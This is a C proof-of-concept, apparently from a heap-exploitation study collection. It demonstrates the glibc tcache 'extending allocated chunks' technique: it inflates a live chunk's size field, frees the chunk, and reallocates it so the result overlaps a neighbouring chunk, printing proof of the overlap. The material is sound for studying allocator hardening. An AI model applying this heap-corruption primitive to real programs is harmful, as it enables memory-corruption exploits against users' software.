/*
 * before-free-tcache.c - Extending Allocated Chunks, tcache variant
 *
 * Demonstrates overlapping inflating an ALLOCATED chunk's SIZE before free().
 *
 * Mechanism:
 *   1. Allocate p1 | p2 | p3 | guard
 *   2. Inflate p2's SIZE while allocated (e.g., 0x21 -> 0x41)
 *   3. free(p2) -> chunksize=0x40 -> csize2tidx(0x40) -> tcache_put to bin[0x40]
 *   4. malloc(0x38) -> same tc_idx -> tcache_get -> p2 with 0x40-byte claim -> overlaps p3
 *
 * tcache_put computes tc_idx from chunk size with NO validation that size
 * matches bin index. The inflated SIZE is the ONLY value used.
 *
 * Build: G=./glibc/build/install
 *   gcc -g -o poc poc.c -Wl,-rpath,$G/lib -Wl,--dynamic-linker=$G/lib/ld-linux-aarch64.so.1
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define TC 16

int main(void) {
    printf("\nExtending Allocated --- tcache-only (glibc 2.43)\n\n");

    long *p1 = malloc(0x18);    /* chunk 0x20 */
    long *p2 = malloc(0x18);    /* chunk 0x20 - victim */
    long *p3 = malloc(0x8);     /* chunk 0x10 - overlap target */
    long *guard = malloc(0x8);  

    printf("p1=%p p2=%p p3=%p guard=%p\n", (void*)p1,(void*)p2,(void*)p3,(void*)guard);

    /* Inflate p2 SIZE while allocated: 0x21 -> 0x41 (covers p2 + p3) */
    size_t *p2size = (size_t*)((char*)p2 - 8);
    printf("[1] Inflate p2 SIZE while allocated: 0x%zx -> 0x41\n", *p2size);
    *p2size = 0x41;

    /* free(p2): chunksize(p2)=0x40 -> tc_idx for 0x40. tcache has room -> tcache_put */
    printf("[2] free(p2) -> chunksize=0x40 -> tcache_put to bin[0x40]\n");
    free(p2);

    /* malloc(0x38): same tc_idx -> tcache_get -> p2, now claiming 0x40 bytes */
    printf("[3] malloc(0x38) -> tcache_get\n");
    long *p4 = malloc(0x38);
    printf("    p4=%p  %s (p2=%p)\n", (void*)p4, p4==p2? "OK!" : "NOPE!", (void*)p2);

    /* Prove overlap: p3 (p2+0x20) is inside p4's 0x40-byte claim */
    memset(p4, 'X', 0x38);
    printf("[4] Wrote 0x38 bytes through p4. p3=%016lx  %s\n",
           *(uint64_t*)p3,
           *(uint64_t*)p3 == 0x5858585858585858ULL ? "OK! OVERLAP!" : "NOPE!");

    printf("[5] p4+0x20 == p3 - p3 is inside p4's region\n");

    free(p4);
    free(p1);
    free(guard);

    printf("[+] Done!\n");
    return 0;
}
